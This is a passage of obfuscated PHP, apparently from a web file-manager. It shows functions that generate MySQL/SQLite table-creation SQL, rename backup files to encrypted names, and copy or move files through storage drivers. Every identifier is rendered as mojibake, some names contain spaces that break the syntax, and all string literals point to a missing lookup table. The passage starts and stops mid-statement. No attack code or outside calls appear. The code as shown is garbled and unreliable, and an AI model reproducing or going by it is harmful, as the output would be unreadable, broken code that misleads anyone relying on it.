? $Â™ÅÇ…Ô[$˜µ¬’†Ò] : $Â™ÅÇ…Ô; } $¿Æ‰ë‰é = $¬Ç„Ş×->query($íâş¤éé); $³ç¹ıš = $Š—¼€½ë[12]; $üÔ¡ï³Â = array(); foreach ($¿Æ‰ë‰é as $Éè¯î×î) { if (!$³ç¹ıš && $Éè¯î×î[$Š—¼€½ë[1219]] == $Š—¼€½ë[1220]) { $³ç¹ıš = $Éè¯î×î[$Š—¼€½ë[1221]]; } if (isset($üÔ¡ï³Â[$Éè¯î×î[$Š—¼€½ë[1219]]])) { $üÔ¡ï³Â[$Éè¯î×î[$Š—¼€½ë[1219]]][$Š—¼€½ë[1222]][] = $Éè¯î×î[$Š—¼€½ë[1221]]; continue; } $üÔ¡ï³Â[$Éè¯î×î[$Š—¼€½ë[1219]]] = array($Š—¼€½ë[1223] => $Éè¯î×î[$Š—¼€½ë[1219]], $Š—¼€½ë[1222] => array($Éè¯î×î[$Š—¼€½ë[1221]]), $Š—¼€½ë[1224] => $Éè¯î×î[$Š—¼€½ë[1225]] == $Š—¼€½ë[91] ? 0 : 1); } $¿×¬Å™ù = array(); foreach ($üÔ¡ï³Â as $Éè¯î×î) { $Ş¦–“¦ = $Éè¯î×î[$Š—¼€½ë[1223]] == $Š—¼€½ë[1220]; $¦éêû À = $Éè¯î×î[$Š—¼€½ë[1224]] == $Š—¼€½ë[91] && !$Ş¦–“¦ ? $Š—¼€½ë[1226] : $Š—¼€½ë[12]; $îÈêøĞ = $Š—¼€½ë[1227] . $„ŸÕåÕ™ . $Š—¼€½ë[11] . ($Ş¦–“¦ ? $Š—¼€½ë[1228] : $Éè¯î×î[$Š—¼€½ë[1223]]); $ÛË­ÌßÖ = $Š—¼€½ë[1229] . implode($Š—¼€½ë[1230], $Éè¯î×î[$Š—¼€½ë[1222]]) . $Š—¼€½ë[1231]; $¿×¬Å™ù[] = sprintf($Š—¼€½ë[1232], $Š—¼€½ë[1233], $¦éêû À, $Š—¼€½ë[1234], $îÈêøĞ, $Š—¼€½ë[1235], $„ŸÕåÕ™, $ÛË­ÌßÖ); } $¾ÎÒÁ¦ = array(); $Õ€šåöÍ = array($Š—¼€½ë[1236] => $Š—¼€½ë[400], $Š—¼€½ë[1237] => $Š—¼€½ë[400], $Š—¼€½ë[374] => $Š—¼€½ë[400], $Š—¼€½ë[373] => $Š—¼€½ë[400], $Š—¼€½ë[1238] => $Š—¼€½ë[1239], $Š—¼€½ë[1240] => $Š—¼€½ë[1239], $Š—¼€½ë[1239] => $Š—¼€½ë[1239], $Š—¼€½ë[1241] => $Š—¼€½ë[1239], $Š—¼€½ë[283] => $Š—¼€½ë[1239], $Š—¼€½ë[1242] => $Š—¼€½ë[1239], $Š—¼€½ë[1243] => $Š—¼€½ë[1239], $Š—¼€½ë[1244] => $Š—¼€½ë[1245], $Š—¼€½ë[375] => $Š—¼€½ë[1245], $Š—¼€½ë[376] => $Š—¼€½ë[1245], $Š—¼€½ë[1246] => $Š—¼€½ë[1246]); foreach ($‘­ÀÁŞÓ as $Éè¯î×î) { $˜µ¬’†Ò = _get($Õ€šåöÍ, $Éè¯î×î[$Š—¼€½ë[1247]], $Éè¯î×î[$Š—¼€½ë[1248]]); $¤·¿œÂ¸ = $Éè¯î×î[$Š—¼€½ë[1249]] == $Š—¼€½ë[1013] ? $Š—¼€½ë[1250] : $Š—¼€½ë[1251]; $›õ˜¦©è = $Éè¯î×î[$Š—¼€½ë[1252]] == $³ç¹ıš ? $Š—¼€½ë[1253] : $Š—¼€½ë[12]; $ø¯‹Ÿ·… = $Éè¯î×î[$Š—¼€½ë[1067]] ? strtoupper(str_replace($Š—¼€½ë[11], $Š—¼€½ë[12], $Éè¯î×î[$Š—¼€½ë[1067]])) : $Š—¼€½ë[12]; $¾ÎÒÁ¦[] = sprintf($Š—¼€½ë[1254], $Éè¯î×î[$Š—¼€½ë[1252]], $˜µ¬’†Ò, $¤·¿œÂ¸, $›õ˜¦©è, $ø¯‹Ÿ·…); } $£‚¡–¸ = array("\x44\122\117\x50\40\124\x41\x42\114\105\x20\111\x46\x20\105\130\111\x53\x54\x53\40{$üÄ­ÒŸÇ}\x3b", "\103\122\x45\x41\124\105\40\x54\101\x42\x4c\105\x20{$üÄ­ÒŸÇ}\40\x28", implode($Š—¼€½ë[50] . PHP_EOL, $¾ÎÒÁ¦), $Š—¼€½ë[1255]); $ºßå•ˆ— = implode(PHP_EOL, array_merge($£‚¡–¸, $¿×¬Å™ù)); if ($˜µ¬’†Ò == $Š—¼€½ë[13]) { return $ºßå•ˆ—; } $Â™ÅÇ…Ô[$Š—¼€½ë[13]] = $ºßå•ˆ—; return $Â™ÅÇ…Ô; } public function sqlFromSqlite($¹´ÛúÔ¿, $¥óşçŸ² = '') { $•âç¥–Á =& $_SERVER[‘ÆÜ‘œ]; $¾³˜­Ÿ = array($•âç¥–Á[910] => $•âç¥–Á[12], $•âç¥–Á[13] => $•âç¥–Á[12]); $Í›ê„·ğ = $this->escapeName($¹´ÛúÔ¿); $ÒáÏÑœ = $this->escapeName($¹´ÛúÔ¿, $•âç¥–Á[13]); $œ§©¡Ë™ = $this->model()->db(); $˜¨á…ˆø = "\120\x52\101\107\115\101\40\x54\101\x42\114\x45\137\111\116\106\117\40\x28\x27{$¹´ÛúÔ¿}\47\51"; $Íôö”ñÌ = "\x53\x45\x4c\105\x43\x54\40\52\40\106\x52\x4f\x4d\x20\x73\161\154\151\x74\145\x5f\155\x61\x73\164\x65\x72\40\x57\110\x45\x52\105\x20\164\142\154\x5f\156\x61\x6d\x65\x20\75\40\47{$¹´ÛúÔ¿}\47"; $—òÛ¢èû = $œ§©¡Ë™->query($˜¨á…ˆø); if (empty($—òÛ¢èû)) { return $¥óşçŸ² ? $¾³˜­Ÿ[$¥óşçŸ²] : $¾³˜­Ÿ; } $ÂÜÛûÉæ = $œ§©¡Ë™->query($Íôö”ñÌ); $²Ã†¿â½ = $ºÕ…¬Ê = array(); foreach ($ÂÜÛûÉæ as $¹ÒÅÈİ¹) { if ($¹ÒÅÈİ¹[$•âç¥–Á[33]] == $•âç¥–Á[367]) { $²Ã†¿â½[] = $¹ÒÅÈİ¹[$•âç¥–Á[1256]]; } else { $ºÕ…¬Ê[] = $¹ÒÅÈİ¹[$•âç¥–Á[1256]]; } } $ƒ÷—ãÎ  = array_merge(array("\104\122\117\x50\40\x54\x41\102\114\105\x20\111\x46\40\105\130\x49\x53\124\123\40{$ÒáÏÑœ}\x3b"), $²Ã†¿â½, $ºÕ…¬Ê); $ƒ÷—ãÎ  = implode($•âç¥–Á[74] . PHP_EOL, $ƒ÷—ãÎ ) . $•âç¥–Á[74]; if ($¥óşçŸ² == $•âç¥–Á[13]) { return $ƒ÷—ãÎ ; } $¾³˜­Ÿ[$•âç¥–Á[13]] = $ƒ÷—ãÎ ; $‚±ƒ¦È  = $³ÓËŞíÕ = array(); $»³œˆÀ¾ = array(); $ãÕí§£ = array(); foreach ($ÂÜÛûÉæ as $¹ÒÅÈİ¹) { if ($¹ÒÅÈİ¹[$•âç¥–Á[33]] == $•âç¥–Á[1257]) { $ÈÉ³¶Ÿâ = $¹ÒÅÈİ¹[$•âç¥–Á[1256]]; $çÕ‰Ÿææ = stripos($ÈÉ³¶Ÿâ, $•âç¥–Á[1226]) !== !1; $ş†šÙÏË = stripos($ÈÉ³¶Ÿâ, $•âç¥–Á[1220]) !== !1; preg_match($•âç¥–Á[1258], $ÈÉ³¶Ÿâ, $‹µóÈØî); if (empty($‹µóÈØî)) { continue; } $ÜåÇ®§¥ = array_map($•âç¥–Á[1259], explode($•âç¥–Á[50], $‹µóÈØî[1])); $ß˜±ò¿ê = array(); foreach ($ÜåÇ®§¥ as $«äÎÕÜ÷) { $óœÊÎ¦ = trim($«äÎÕÜ÷, $•âç¥–Á[1260]); $ß˜±ò¿ê[] = $óœÊÎ¦; $»³œˆÀ¾[$óœÊÎ¦] = !0; } $ãÕí§£[] = array($•âç¥–Á[32] => $¹ÒÅÈİ¹[$•âç¥–Á[32]], $•âç¥–Á[1256] => $ÈÉ³¶Ÿâ, $•âç¥–Á[1261] => $çÕ‰Ÿææ, $•âç¥–Á[1262] => $ş†šÙÏË, $•âç¥–Á[1263] => $ß˜±ò¿ê); } } $Ò˜Ö’ù = array($•âç¥–Á[1237] => $•âç¥–Á[1237], $•âç¥–Á[400] => $•âç¥–Á[1264], $•âç¥–Á[1245] => $•âç¥–Á[1265], $•âç¥–Á[1239] => $•âç¥–Á[1239], $•âç¥–Á[1246] => $•âç¥–Á[1266], $•âç¥–Á[1267] => $•âç¥–Á[1268]); $¬ç…¦¡ü = array($•âç¥–Á[460], $•âç¥–Á[169], $•âç¥–Á[548]); $€»êºœ¿ = array($•âç¥–Á[400], $•âç¥–Á[1245], $•âç¥–Á[1267], $•âç¥–Á[1237]); foreach ($—òÛ¢èû as $¹ÒÅÈİ¹) { $ÎƒÎ§÷® = $¹ÒÅÈİ¹[$•âç¥–Á[32]]; $äÚ•ıÙ = strtolower($¹ÒÅÈİ¹[$•âç¥–Á[33]]); if ($äÚ•ıÙ == $•âç¥–Á[1239] && isset($»³œˆÀ¾[$ÎƒÎ§÷®])) { $¥óşçŸ² = in_array($ÎƒÎ§÷®, $¬ç…¦¡ü) ? $•âç¥–Á[1239] : $•âç¥–Á[1269]; } else { $¥óşçŸ² = _get($Ò˜Ö’ù, $äÚ•ıÙ, $äÚ•ıÙ); } if ($¹ÒÅÈİ¹[$•âç¥–Á[57]] > 0) { $³ÓËŞíÕ[$¹ÒÅÈİ¹[$•âç¥–Á[57]]] = $ÎƒÎ§÷®; } $À‰´İÂï = $•âç¥–Á[12]; if ($¹ÒÅÈİ¹[$•âç¥–Á[56]] !== null) { $ÊûÌˆü“ = $¹ÒÅÈİ¹[$•âç¥–Á[56]]; if (in_array($äÚ•ıÙ, $€»êºœ¿) && is_numeric($ÊûÌˆü“)) { $À‰´İÂï = "\104\105\106\101\x55\114\x54\40{$ÊûÌˆü“}"; } else { if (strtolower($ÊûÌˆü“) === $•âç¥–Á[104]) { $À‰´İÂï = $¹ÒÅÈİ¹[$•âç¥–Á[35]] ? $•âç¥–Á[12] : $•âç¥–Á[1251]; } else { $æéÂú˜¼ = is_numeric($ÊûÌˆü“) ? $ÊûÌˆü“ : $•âç¥–Á[58] . addslashes($ÊûÌˆü“) . $•âç¥–Á[58]; $À‰´İÂï = "\104\x45\106\101\125\114\x54\x20{$æéÂú˜¼}"; } } } $³â˜º•ä = $¹ÒÅÈİ¹[$•âç¥–Á[35]] ? $•âç¥–Á[1250] : $•âç¥–Á[1270]; $¹¢ì–ìõ = stripos($äÚ•ıÙ, $•âç¥–Á[374]) !== !1 && $¹ÒÅÈİ¹[$•âç¥–Á[57]] ? $•âç¥–Á[1271] : $•âç¥–Á[12]; $‚±ƒ¦È [] = sprintf($•âç¥–Á[1272], $ÎƒÎ§÷®, $¥óşçŸ², $³â˜º•ä, $À‰´İÂï, $¹¢ì–ìõ); } if (!empty($³ÓËŞíÕ)) { ksort($³ÓËŞíÕ); $´š•èÖ¨ = $•âç¥–Á[484] . implode($•âç¥–Á[1192], $³ÓËŞíÕ) . $•âç¥–Á[484]; $‚±ƒ¦È [] = "\x50\x52\x49\115\101\x52\x59\x20\113\105\x59\40\x28{$´š•èÖ¨}\51"; } foreach ($ãÕí§£ as $˜äØò˜¬) { if ($˜äØò˜¬[$•âç¥–Á[1262]]) { continue; } $Ñşçê² = array(); foreach ($˜äØò˜¬[$•âç¥–Á[1263]] as $«äÎÕÜ÷) { $Ò˜Ö’ù = null; foreach ($—òÛ¢èû as $£âïäˆ) { if ($£âïäˆ[$•âç¥–Á[32]] == $«äÎÕÜ÷) { $Ò˜Ö’ù = strtolower($£âïäˆ[$•âç¥–Á[33]]); break; } } if ($Ò˜Ö’ù == $•âç¥–Á[1239] && in_array($«äÎÕÜ÷, $¬ç…¦¡ü)) { $Ñşçê²[] = "\x60{$«äÎÕÜ÷}\x60\x28\x32\x35\60\x29"; } else { $Ñşçê²[] = "\140{$«äÎÕÜ÷}\x60"; } } $äÚ•ıÙ = ($˜äØò˜¬[$•âç¥–Á[1261]] ? $•âç¥–Á[1273] : $•âç¥–Á[12]) . $•âç¥–Á[1274]; $¿ûÄÙ­– = str_replace($•âç¥–Á[1227] . $¹´ÛúÔ¿ . $•âç¥–Á[11], $•âç¥–Á[12], $˜äØò˜¬[$•âç¥–Á[32]]); $¿ûÄÙ­– = str_replace($¹´ÛúÔ¿ . $•âç¥–Á[11], $•âç¥–Á[12], $¿ûÄÙ­–); $‚±ƒ¦È [] = "{$äÚ•ıÙ}\40\140{$¿ûÄÙ­–}\x60\40\50" . implode($•âç¥–Á[50], $Ñşçê²) . $•âç¥–Á[1191]; } $Í¡„ï³û = array("\x44\122\x4f\120\40\x54\x41\x42\114\x45\40\x49\x46\40\x45\130\111\123\124\x53\x20{$Í›ê„·ğ}\73", "\x43\x52\105\x41\124\105\x20\x54\101\102\x4c\105\40{$Í›ê„·ğ}\x20\x28", implode($•âç¥–Á[50] . PHP_EOL, $‚±ƒ¦È ), $•âç¥–Á[1275]); $Í¡„ï³û = implode(PHP_EOL, $Í¡„ï³û); if ($¥óşçŸ² == $•âç¥–Á[910]) { return $Í¡„ï³û; } $¾³˜­Ÿ[$•âç¥–Á[910]] = $Í¡„ï³û; return $¾³˜­Ÿ; } private function escapeName($È«¢ŒÒü, $ğ†öÁ” = "\155\171\163\161\154") { $­ûâé‰’ =& $_SERVER[‘ÆÜ‘œ]; $È«¢ŒÒü = preg_replace($­ûâé‰’[1276], $­ûâé‰’[12], $È«¢ŒÒü); if ($ğ†öÁ” === $­ûâé‰’[910]) { return "\x60{$È«¢ŒÒü}\140"; } return "\x22{$È«¢ŒÒü}\x22"; } public function mixBakList($¥‹§Ğ¾–) { $Ü²¸æÇ =& $_SERVER[‘ÆÜ‘œ]; $¥‹§Ğ¾– = rtrim($¥‹§Ğ¾–, $Ü²¸æÇ[8]) . $Ü²¸æÇ[8]; $­÷ÓÌ = $Ü²¸æÇ[1277]; $ÙßË¾²å = IO::listPath($¥‹§Ğ¾–); if (empty($ÙßË¾²å[$Ü²¸æÇ[86]])) { return !1; } $ÖäàÓ„ = array(); foreach ($ÙßË¾²å[$Ü²¸æÇ[86]] as $ºû È¥Ï => $¿´®½Ùü) { if (!$¿´®½Ùü[$Ü²¸æÇ[32]] || !$¿´®½Ùü[$Ü²¸æÇ[87]]) { continue; } $ÑÉóŸáÓ = Mcrypt::encode($¿´®½Ùü[$Ü²¸æÇ[32]], $­÷ÓÌ); $˜ñöåÌ¯ = md5($ÑÉóŸáÓ); IO::rename($¿´®½Ùü[$Ü²¸æÇ[87]], $˜ñöåÌ¯); $ÖäàÓ„[$˜ñöåÌ¯] = $ÑÉóŸáÓ; } $®ÈÓÑùí = md5($Ü²¸æÇ[1278] . $­÷ÓÌ); IO::setContent($¥‹§Ğ¾– . $®ÈÓÑùí, json_encode($ÖäàÓ„)); return !0; } public function unmixBakList($œº§¢ş) { $åû±ñ¯³ =& $_SERVER[‘ÆÜ‘œ]; $œº§¢ş = rtrim($œº§¢ş, $åû±ñ¯³[8]) . $åû±ñ¯³[8]; $š†Óä ñ = $this->unmixBakListGet($œº§¢ş, !0); if (empty($š†Óä ñ)) { return !1; } foreach ($š†Óä ñ as $­ğäáğ» => $İÀûĞ) { $ŒŞÕÇ¡ò = IO::rename($œº§¢ş . $İÀûĞ, $­ğäáğ»); if (!$ŒŞÕÇ¡ò) { return !1; } } return !0; } public function unmixBakListGet($ş·íö˜¼, $À»–»üË = false) { $¢µ±Ì– =& $_SERVER[‘ÆÜ‘œ]; $ş·íö˜¼ = rtrim($ş·íö˜¼, $¢µ±Ì–[8]) . $¢µ±Ì–[8]; $Ù¥æº¯ = $¢µ±Ì–[1277]; $ÛÀ—ï¡Ú = md5($¢µ±Ì–[1278] . $Ù¥æº¯); $İÛ˜Ò¹ = $ş·íö˜¼ . $ÛÀ—ï¡Ú; if (!IO::exist($İÛ˜Ò¹)) { return !1; } $è¾Îã°³ = json_decode(IO::getContent($İÛ˜Ò¹), !0); if (empty($è¾Îã°³)) { return !1; } $‘ÄØ×È = array(); foreach ($è¾Îã°³ as $òãì³½ğ => $™ş©Æ“ö) { $ÛÀ—ï¡Ú = Mcrypt::decode($™ş©Æ“ö, $Ù¥æº¯); $‘ÄØ×È[$ÛÀ—ï¡Ú] = $òãì³½ğ; } if ($À»–»üË) { IO::remove($İÛ˜Ò¹, !1); } return $‘ÄØ×È; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ÂéùÂáù, $§”Ôá„Õ) { $¼†¼Ç’õ =& $_SERVER[‘ÆÜ‘œ]; $ïç•¡´€ = $§”Ôá„Õ; $GLOBALS[$¼†¼Ç’õ[1279]] = $¼†¼Ç’õ[1280] . $ÂéùÂáù; Hook::trigger($¼†¼Ç’õ[1280] . $ÂéùÂáù . $¼†¼Ç’õ[1281], $ïç•¡´€); $´“Ç¬Û® = self::driverMake($§”Ôá„Õ[0]); if (!$´“Ç¬Û®) { return !1; } if ($ÂéùÂáù == $¼†¼Ç’õ[649] || $ÂéùÂáù == $¼†¼Ç’õ[651] || $ÂéùÂáù == $¼†¼Ç’õ[1282]) { if (!trim($´“Ç¬Û®->path . $¼†¼Ç’õ[472], $¼†¼Ç’õ[8])) { return !1; } } if (method_exists($´“Ç¬Û®, $ÂéùÂáù)) { $Ã—¦™ì = @call_user_func_array(array($´“Ç¬Û®, $ÂéùÂáù), $§”Ôá„Õ); } else { if (method_exists($´“Ç¬Û®, $¼†¼Ç’õ[1283])) { $Ã—¦™ì = @call_user_func_array(array($´“Ç¬Û®, $ÂéùÂáù), $§”Ôá„Õ); } else { if (method_exists(self, $ÂéùÂáù)) { $Ã—¦™ì = @call_user_func_array(array(self, $ÂéùÂáù), $§”Ôá„Õ); } else { $Ã—¦™ì = call_user_func_array(array(parent, $ÂéùÂáù), $§”Ôá„Õ); } } } Hook::trigger($¼†¼Ç’õ[1280] . $ÂéùÂáù . $¼†¼Ç’õ[1284], $ïç•¡´€, $Ã—¦™ì); return $Ã—¦™ì; } public static function init($áÙ×¶Ä) { return self::driverMake($áÙ×¶Ä); } public static function copy($¢—ëŞˆË, $¹¼Å´‘, $ŸÕ¯…ã± = false, $ĞÊÔ©õ = false) { return self::copyMoveStart($¢—ëŞˆË, $¹¼Å´‘, $ŸÕ¯…ã±, $_SERVER[‘ÆÜ‘œ][649], $ĞÊÔ©õ); } public static function move($…ş¯¿ÉÑ, $ôÌù•Œ£, $‘ÏóÏö = false, $†š†Š©Û = false) { return self::copyMoveStart($…ş¯¿ÉÑ, $ôÌù•Œ£, $‘ÏóÏö, $_SERVER[‘ÆÜ‘œ][651], $†š†Š©Û); } public static function copyMoveChildren($ÅÕÛ§û², $£ëÌ´Şè, $Ñó‰œ…õ = "\x63\157\160\x79", $±¾Ù³ = REPEAT_REPLACE) { $—şôÔ–û =& $_SERVER[‘ÆÜ‘œ]; $™ÈÈÈº = $ÅÕÛ§û²; $õ»Ôâ·” = self::driverMake($ÅÕÛ§û²); $ °Üªû¼ = $õ»Ôâ·”->listPath($ÅÕÛ§û², !0); $­ê¾ôî€ = array_merge($ °Üªû¼[$—şôÔ–û[86]], $ °Üªû¼[$—şôÔ–û[85]]); foreach ($­ê¾ôî€ as $åÀ¯İÓ¥) { self::copyMoveStart($åÀ¯İÓ¥[$—şôÔ–û[87]], $£ëÌ´Şè, $±¾Ù³, $Ñó‰œ…õ, !1); } if ($Ñó‰œ…õ == $—şôÔ–û[651]) { self::remove($™ÈÈÈº); } } private static function copyMoveStart($Ï¹’ç÷¬, $‹ÏÑ§×, $Ò€£õ¾, $“¯…àÉ, $ºüôÙ¿Ú) { $Û”ù½Â =& $_SERVER[‘ÆÜ‘œ]; $µ‚ĞéÂ = array($Ï¹’ç÷¬, $‹ÏÑ§×, $Ò€£õ¾, $ºüôÙ¿Ú); Hook::trigger($Û”ù½Â[1280] . $“¯…àÉ . $Û”ù½Â[1281], $µ‚ĞéÂ); $‹ò¦™”İ = self::copyMove($Ï¹’ç÷¬, $‹ÏÑ§×, $Ò€£õ¾, $“¯…àÉ, $ºüôÙ¿Ú); Hook::trigger($Û”ù½Â[1280] . $“¯…àÉ . $Û”ù½Â[1284], $µ‚ĞéÂ, $‹ò¦™”İ); return $‹ò¦™”İ; } public static function saveFile($”¤¬˜ŞÂ, $Óâº‹ñ®, $ ±¤½—¥ = true) { $„‡Äí¾ =& $_SERVER[‘ÆÜ‘œ]; $Èë€­°¶ = self::info($Óâº‹ñ®); $¥¯¶àÀË = self::driverMake($”¤¬˜ŞÂ); $™®ï˜ùÙ = self::driverMake($Óâº‹ñ®); $Î…ªŞ÷ = !1; if ($™®ï˜ùÙ->pathParse[$„‡Äí¾[1285]]) { $Î…ªŞ÷ = $™®ï˜ùÙ; $ü¸Ü–†Á = $™®ï˜ùÙ->pathParse[$„‡Äí¾[1285]]; $™®ï˜ùÙ = self::driverMake($ü¸Ü–†Á); } if ($¥¯¶àÀË->pathParse[$„‡Äí¾[1285]]) { $¦°û»¨® = $¥¯¶àÀË->pathParse[$„‡Äí¾[1285]]; $¥¯¶àÀË = self::driverMake($¦°û»¨®); } $«Û‚Ïı = $™®ï˜ùÙ->pathFather($Óâº‹ñ®); $©äè¿ÍÃ = !0; if (!$ ±¤½—¥ && self::driverIsSame($¥¯¶àÀË, $™®ï˜ùÙ)) { $©äè¿ÍÃ = !1; } $Šì–ÕüÈ = self::copyFile($¥¯¶àÀË, $”¤¬˜ŞÂ, $™®ï˜ùÙ, $«Û‚Ïı, $Èë€­°¶[$„‡Äí¾[32]], $©äè¿ÍÃ); if ($Î…ªŞ÷) { $Šì–ÕüÈ = $Î…ªŞ÷->getPathOuter($Šì–ÕüÈ); } return $Šì–ÕüÈ; } private static function copyMove($È†Á™º…, $…½¿½íÑ, $·ÍÂ®Ğ˜, $€è¿‚úƒ, $‹Ä‚‘‚è = false) { $Ğ™·áĞÓ =& $_SERVER[‘ÆÜ‘œ]; if (!$È†Á™º… || $È†Á™º… == $Ğ™·áĞÓ[8] || !$…½¿½íÑ) { return !1; } ignore_timeout(); $Ïñãà‰“ = self::driverMake($È†Á™º…); $Ùë‹øÎ = self::driverMake($…½¿½íÑ); $»Ò¶–Œ = $€è¿‚úƒ == $Ğ™·áĞÓ[651]; $‰òÑë© = !1; if ($Ùë‹øÎ->pathParse[$Ğ™·áĞÓ[1285]]) { $‰òÑë© = $Ùë‹øÎ; $…½¿½íÑ = $Ùë‹øÎ->pathParse[$Ğ™·áĞÓ[1285]]; $Ùë‹øÎ = self::driverMake($…½¿½íÑ); } if ($Ïñãà‰“->pathParse[$Ğ™·áĞÓ[1285]]) { $È†Á™º… = $Ïñãà‰“->pathParse[$Ğ™·áĞÓ[1285]]; $Ïñãà‰“ = self::driverMake($È†Á™º…); } self::check($Ïñãà‰“, $È†Á™º…, $Ùë‹øÎ, $…½¿½íÑ); Hook::trigger($Ğ™·áĞÓ[1286], $Ïñãà‰“, $È†Á™º…, $Ùë‹øÎ, $…½¿½íÑ); $¦˜·Öï½ = self::driverIsSame($Ïñãà‰“, $Ùë‹øÎ); if ($¦˜·Öï½) { if ($€è¿‚úƒ == $Ğ™·áĞÓ[651] && !method_exists($Ùë‹øÎ, $Ğ™·áĞÓ[1287]) && trim($…½¿½íÑ, $Ğ™·áĞÓ[8]) == trim($Ùë‹øÎ->pathFather($È†Á™º…), $Ğ™·áĞÓ[8])) { if ($Ïñãà‰“->pathThis($È†Á™º…) != $‹Ä‚‘‚è && !$Ïñãà‰“->isOsDriver()) { return $Ïñãà‰“->rename($È†Á™º…, $‹Ä‚‘‚è); } return $Ùë‹øÎ->getPathOuter($È†Á™º…); } if (method_exists($Ùë‹øÎ, $€è¿‚úƒ)) { return $Ùë‹øÎ->{$€è¿‚úƒ}($È†Á™º…, $…½¿½íÑ, $·ÍÂ®Ğ˜, $‹Ä‚‘‚è); } } if ($¦˜·Öï½ && $€è¿‚úƒ == $Ğ™·áĞÓ[651] && $Ùë‹øÎ->getType() == $Ğ™·áĞÓ[107]) { $˜¤â¾œ™ = $Ùë‹øÎ->movePath($È†Á™º…, $…½¿½íÑ, $‹Ä‚‘‚è); if ($˜¤â¾œ™) { return $˜¤â¾œ™; } } $£ÈµŠœ‹ = $Ïñãà‰“->isFile($È†Á™º…); if (!$£ÈµŠœ‹ && $Ùë‹øÎ->getType() == $Ğ™·áĞÓ[865] && $Ïñãà‰“->getType() == $Ğ™·áĞÓ[107]) { $˜¤â¾œ™ = $Ùë‹øÎ->copyFolderFromIO($Ïñãà‰“, $È†Á™º…, $…½¿½íÑ, $·ÍÂ®Ğ˜, $»Ò¶–Œ, $‹Ä‚‘‚è); } else { $˜¤â¾œ™ = self::copyPath($Ïñãà‰“, $È†Á™º…, $Ùë‹øÎ, $…½¿½íÑ, $·ÍÂ®Ğ˜, $»Ò¶–Œ, $£ÈµŠœ‹, $‹Ä‚‘‚è); } if ($˜¤â¾œ™ && $»Ò¶–Œ) { $Ïñãà‰“->remove($È†Á™º…); } if ($‰òÑë©) { $˜¤â¾œ™ = $‰òÑë©->getPathOuter($˜¤â¾œ™); } return $˜¤â¾œ™; } private static function check($£º•ã®ˆ, $®ªÇÍÜñ, $•”Úâş, &$Ùº´¦Óß) { $¥Ìº¯Û¬ =& $_SERVER[‘ÆÜ‘œ]; if (self::driverIsSame($£º•ã®ˆ, $•”Úâş) && $£º•ã®ˆ->isFolder($®ªÇÍÜñ) && $£º•ã®ˆ->isParentOf($®ªÇÍÜñ, $Ùº´¦Óß)) { show_json(LNG($¥Ìº¯Û¬[1288]), !1); } if (!$£º•ã®ˆ->exist($®ªÇÍÜñ)) { show_json(LNG($¥Ìº¯Û¬[106]), !1); } } private static function copyPath($¨á®õ¢¸, $¶´®µ‘ú, $ç¨ƒóàÑ, $€§Ó–ğÏ, $¦çÙÕõ«, $’´É¼ü, $½Öš›†Ğ, $‹Úô©¦ = false, $ì×Ğ½¬Ç = true) { $§¬åŠÔ· =& $_SERVER[‘ÆÜ‘œ]; $…ßÆ™Æå = empty($‹Úô©¦) && $‹Úô©¦ !== $§¬åŠÔ·[229] ? $¨á®õ¢¸->pathThis($¶´®µ‘ú) : $‹Úô©¦; if ($¦çÙÕõ«) { $â¼¹•áû = $ç¨ƒóàÑ->fileNameExist($€§Ó–ğÏ, $…ßÆ™Æå); $ò¯˜÷¢Š = $…ßÆ™Æå; $…ßÆ™Æå = $ç¨ƒóàÑ->fileNameAuto($€§Ó–ğÏ, $…ßÆ™Æå, $¦çÙÕõ«, !$½Öš›†Ğ); if (!$â¼¹•áû || $ò¯˜÷¢Š != $…ßÆ™Æå) { $¦çÙÕõ« = !1; } if ($ì×Ğ½¬Ç && !$¦çÙÕõ«) { $ç¨ƒóàÑ->_data[$§¬åŠÔ·[1289]] = !0; } } if ($½Öš›†Ğ) { return self::copyFile($¨á®õ¢¸, $¶´®µ‘ú, $ç¨ƒóàÑ, $€§Ó–ğÏ, $…ßÆ™Æå, $’´É¼ü); } if ($¦çÙÕõ« == REPEAT_RENAME_FOLDER) { $¦çÙÕõ« = !1; } $ıçÉ¼¬³ = rtrim($€§Ó–ğÏ, $§¬åŠÔ·[8]) . $§¬åŠÔ·[8] . $…ßÆ™Æå; $¾ÛÍœ©² = $ç¨ƒóàÑ->mkdir($ç¨ƒóàÑ->getPath($ıçÉ¼¬³), $¦çÙÕõ«); $€§Ó–ğÏ = $ç¨ƒóàÑ->getPathInner($¾ÛÍœ©²); $¡ã“æ±Å = $¨á®õ¢¸->listPath($¶´®µ‘ú, !0); $¡ã“æ±Å = is_array($¡ã“æ±Å) ? $¡ã“æ±Å : array($§¬åŠÔ·[86] => array(), $§¬åŠÔ·[85] => array()); $’ñâááÍ = array_merge($¡ã“æ±Å[$§¬åŠÔ·[86]], $¡ã“æ±Å[$§¬åŠÔ·[85]]); foreach ($’ñâááÍ as $ìáŞö·) { $£é·³· = $ìáŞö·[$§¬åŠÔ·[33]] == $§¬åŠÔ·[231]; $¶´®µ‘ú = $¨á®õ¢¸->getPathInner($ìáŞö·[$§¬åŠÔ·[87]]); $ê‡ÍÕ‚ª = self::copyPath($¨á®õ¢¸, $¶´®µ‘ú, $ç¨ƒóàÑ, $€§Ó–ğÏ, $¦çÙÕõ«, $’´É¼ü, $£é·³·, !1, !1); if (!$ê‡ÍÕ‚ª) { IO::errorTips($§¬åŠÔ·[1290] . $¶´®µ‘ú . $§¬åŠÔ·[73] . $€§Ó–ğÏ); } } self::copyMoveKeepInfo($¨á®õ¢¸, $¶´®µ‘ú, $¾ÛÍœ©²); return $¾ÛÍœ©²; } private static function copyFile($‘‘İÄ„, $èæ•äÇØ, $Şğ÷”Õ¤, $ç¼ò»¢, $­¾…‡Ìı, $³–æĞÙ) { $ÚÀ£áâŠ =& $_SERVER[‘ÆÜ‘œ]; $ç¼ò»¢ = $Şğ÷”Õ¤->getPath(rtrim($ç¼ò»¢, $ÚÀ£áâŠ[8]) . $ÚÀ£áâŠ[8] . $­¾…‡Ìı); $ÅòøçŸ = $ÚÀ£áâŠ[1291] . time() . rand_string(5); Hook::trigger($ÚÀ£áâŠ[1292], $‘‘İÄ„, $èæ•äÇØ, $Şğ÷”Õ¤, $ç¼ò»¢, $­¾…‡Ìı, $ÅòøçŸ); if (self::driverIsSame($‘‘İÄ„, $Şğ÷”Õ¤)) { if ($³–æĞÙ) { $çÆ„ÓÇÔ = $Şğ÷”Õ¤->moveFile($èæ•äÇØ, $ç¼ò»¢); } else { $çÆ„ÓÇÔ = 